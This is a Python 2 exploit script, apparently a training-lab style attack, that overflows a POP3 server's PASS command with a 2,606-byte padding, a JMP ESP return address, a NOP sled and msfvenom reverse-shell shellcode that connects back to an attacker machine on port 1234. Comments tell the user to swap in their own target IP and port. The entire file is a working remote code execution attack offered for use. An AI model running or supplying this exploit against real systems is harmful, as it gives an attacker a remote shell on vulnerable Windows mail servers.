import struct

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#JMP ESP = 5F4A358F

buf = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 10


#msfvenom -p windows/shell_reverse_tcp LHOST=192.1681.101 LPORT=1234 -f python -a x86 --platform windows -b "\x00\x0a\x0d"

#buf =  b""
buf += b"\xbd\x49\xf1\xaf\xc9\xdd\xc3\xd9\x74\x24\xf4\x58\x2b"
buf += b"\xc9\xb1\x52\x31\x68\x12\x83\xc0\x04\x03\x21\xff\x4d"
buf += b"\x3c\x4d\x17\x13\xbf\xad\xe8\x74\x49\x48\xd9\xb4\x2d"
buf += b"\x19\x4a\x05\x25\x4f\x67\xee\x6b\x7b\xfc\x82\xa3\x8c"
buf += b"\xb5\x29\x92\xa3\x46\x01\xe6\xa2\xc4\x58\x3b\x04\xf4"
buf += b"\x92\x4e\x45\x31\xce\xa3\x17\xea\x84\x16\x87\x9f\xd1"
buf += b"\xaa\x2c\xd3\xf4\xaa\xd1\xa4\xf7\x9b\x44\xbe\xa1\x3b"
buf += b"\x67\x13\xda\x75\x7f\x70\xe7\xcc\xf4\x42\x93\xce\xdc"
buf += b"\x9a\x5c\x7c\x21\x13\xaf\x7c\x66\x94\x50\x0b\x9e\xe6"
buf += b"\xed\x0c\x65\x94\x29\x98\x7d\x3e\xb9\x3a\x59\xbe\x6e"
buf += b"\xdc\x2a\xcc\xdb\xaa\x74\xd1\xda\x7f\x0f\xed\x57\x7e"
buf += b"\xdf\x67\x23\xa5\xfb\x2c\xf7\xc4\x5a\x89\x56\xf8\xbc"
buf += b"\x72\x06\x5c\xb7\x9f\x53\xed\x9a\xf7\x90\xdc\x24\x08"
buf += b"\xbf\x57\x57\x3a\x60\xcc\xff\x76\xe9\xca\xf8\x79\xc0"
buf += b"\xab\x96\x87\xeb\xcb\xbf\x43\xbf\x9b\xd7\x62\xc0\x77"
buf += b"\x27\x8a\x15\xd7\x77\x24\xc6\x98\x27\x84\xb6\x70\x2d"
buf += b"\x0b\xe8\x61\x4e\xc1\x81\x08\xb5\x82\x6d\x64\xb4\x37"
buf += b"\x06\x77\xb6\xb3\x04\xfe\x50\xd1\xb8\x57\xcb\x4e\x20"
buf += b"\xf2\x87\xef\xad\x28\xe2\x30\x25\xdf\x13\xfe\xce\xaa"
buf += b"\x07\x97\x3e\xe1\x75\x3e\x40\xdf\x11\xdc\xd3\x84\xe1"
buf += b"\xab\xcf\x12\xb6\xfc\x3e\x6b\x52\x11\x18\xc5\x40\xe8"
buf += b"\xfc\x2e\xc0\x37\x3d\xb0\xc9\xba\x79\x96\xd9\x02\x81"
buf += b"\x92\x8d\xda\xd4\x4c\x7b\x9d\x8e\x3e\xd5\x77\x7c\xe9"
buf += b"\xb1\x0e\x4e\x2a\xc7\x0e\x9b\xdc\x27\xbe\x72\x99\x58"
buf += b"\x0f\x13\x2d\x21\x6d\x83\xd2\xf8\x35\xb3\x98\xa0\x1c"
buf += b"\x5c\x45\x31\x1d\x01\x76\xec\x62\x3c\xf5\x04\x1b\xbb"
buf += b"\xe5\x6d\x1e\x87\xa1\x9e\x52\x98\x47\xa0\xc1\x99\x4d"


#RHOST = 192.168.1.108 (Change according to your IP)
#RPORT = 110 (Change according to your Vulnerable service port)

try:
        print "\nSending evil buffer..."
        s.connect(('192.168.1.108',110))
        data = s.recv(1024)
        s.send('USER username' +'\r\n')
        data = s.recv(1024)
        s.send('PASS ' + buf + '\r\n')
        data = s.recv(1024)
        s.close()
except:
        print "Could not connect to POP3!"
